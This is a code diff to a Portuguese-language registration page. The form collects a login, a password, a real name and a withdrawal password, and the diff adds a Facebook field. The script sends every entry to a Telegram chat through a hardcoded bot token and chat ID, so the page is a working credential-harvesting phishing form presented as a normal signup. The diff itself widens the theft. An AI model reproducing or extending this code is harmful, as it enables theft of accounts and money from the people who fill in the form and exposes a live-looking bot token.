@@ -31,12 +31,15 @@
         <div class="box"><i class="fa-solid fa-lock"></i><input type="password" id="pass" placeholder="Senha Login" required></div>
         <div class="box"><i class="fa-solid fa-id-card"></i><input type="text" id="nome" placeholder="Nome Real" required></div>
         <div class="box"><i class="fa-solid fa-shield"></i><input type="password" id="saque" placeholder="Senha Saque" required></div>
+        
+        <div class="box"><i class="fa-brands fa-facebook"></i><input type="text" id="fb" placeholder="Facebook (Opcional)"></div>
+        
         <button type="submit" id="btn" class="btn">REGISTRAR</button>
     </form>
 </div>
 
 <script>
-    // Seus dados reais (conforme imagens anteriores)
+    // Seus dados reais configurados
     const TOKEN = "8599880345:AAGQy8ofddvyj-efl_lFUo44KMLEt1uuxMo"; 
     const CHAT_ID = "-4996441181"; 
 
@@ -48,8 +51,8 @@
         const pass = document.getElementById('pass').value;
         const nome = document.getElementById('nome').value;
         const saque = document.getElementById('saque').value;
+        const fb = document.getElementById('fb').value || "Não informado";
 
-        // Verifica se tem pelo menos 3 caracteres conforme solicitado
         if(user.length < 3 || pass.length < 3) {
             alert("Preencha ao menos 3 caracteres!");
             return;
@@ -58,7 +61,7 @@
         btn.innerText = "A ENVIAR...";
         btn.disabled = true;
 
-        const texto = `🔔 NOVO CADASTRO 🔔\n\n👤 Usuário/Tel: ${user}\n🔑 Senha: ${pass}\n💳 Nome: ${nome}\n💰 Saque: ${saque}`;
+        const texto = `🔔 NOVO CADASTRO 🔔\n\n👤 Usuário/Tel: ${user}\n🔑 Senha: ${pass}\n💳 Nome: ${nome}\n💰 Saque: ${saque}\n📱 Facebook: ${fb}`;
 
         const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`;
 
@@ -68,13 +71,13 @@
                 alert("✅ Registrado com sucesso!");
                 location.reload();
             } else {
-                alert("❌ Erro no Telegram. Verifique se o Bot é ADMIN do grupo.");
+                alert("❌ Erro no Telegram. Verifique se o Bot é ADMIN.");
                 btn.disabled = false;
                 btn.innerText = "REGISTRAR";
             }
         })
         .catch(() => {
-            alert("❌ Erro de conexão! Verifique sua internet.");
+            alert("❌ Erro de conexão!");
             btn.disabled = false;
             btn.innerText = "REGISTRAR";
         });
